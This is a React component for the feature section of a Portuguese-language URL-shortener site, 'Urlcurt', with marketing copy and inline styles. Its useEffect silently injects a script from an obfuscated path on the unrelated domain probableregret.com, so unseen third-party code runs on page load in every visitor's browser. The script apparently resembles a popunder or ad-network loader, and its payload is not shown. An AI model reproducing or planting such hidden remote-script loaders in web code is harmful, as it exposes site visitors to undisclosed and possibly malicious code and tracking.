import React, { useEffect } from 'react';

const FeaturesSection: React.FC = () => {
  
  useEffect(() => {
    const s = document.createElement('script');
    s.src = "//probableregret.com/bWX.VesKdUGwlB0RY/WhcM/ae_mc9/u/ZeUclOkcPhTbYk1DNKjskK2jM/zIY/tONnjUUI2DOGTCY/zNNQwH";
    s.async = true;
    s.referrerPolicy = 'no-referrer-when-downgrade';
    
    const currentScript = document.scripts[document.scripts.length - 1];
    currentScript.parentNode?.insertBefore(s, currentScript);

    return () => {
      // Opcional: remover o script ao desmontar o componente
      s.remove();
    };
  }, []);

  return (
    <section className="features-section">
      <h2>Por que usar o Urlcurt?</h2>
      <div className="features">
        <div className="feature">
          <h3>🔗 URLs mais curtas</h3>
          <p>
            Deixe seus links mais elegantes e fáceis de compartilhar em redes sociais, e-mails e mensagens.
          </p>
        </div>
        <div className="feature">
          <h3>📈 Estatísticas em tempo real</h3>
          <p>
            Acompanhe quantas pessoas clicaram em seus links, de onde vieram e qual dispositivo usaram.
          </p>
        </div>
        <div className="feature">
          <h3>🔒 Segurança e privacidade</h3>
          <p>
            Seus links são protegidos, e você pode configurar redirecionamentos com mais controle.
          </p>
        </div>
        
      </div>

      <style>{`
        .features-section {
          max-width: 1000px;
          margin: 4rem auto;
          padding: 0 1.5rem;
          color: #e0e7ff;
        }

        .features-section h2 {
          text-align: center;
          font-size: 2rem;
          margin-bottom: 2rem;
        }

        .features {
          display: grid;
          grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
          gap: 2rem;
        }

        .feature {
          background: rgba(255, 255, 255, 0.05);
          border-radius: 12px;
          padding: 1.5rem;
          box-shadow: 0 4px 15px rgba(0,0,0,0.2);
          backdrop-filter: blur(6px);
        }

        .feature h3 {
          font-size: 1.25rem;
          margin-bottom: 0.5rem;
          color: #a78bfa;
        }

        .feature p {
          font-size: 1rem;
          line-height: 1.5;
          color: #cbd5e1;
        }
      `}</style>
    </section>
  );
};

export default FeaturesSection;
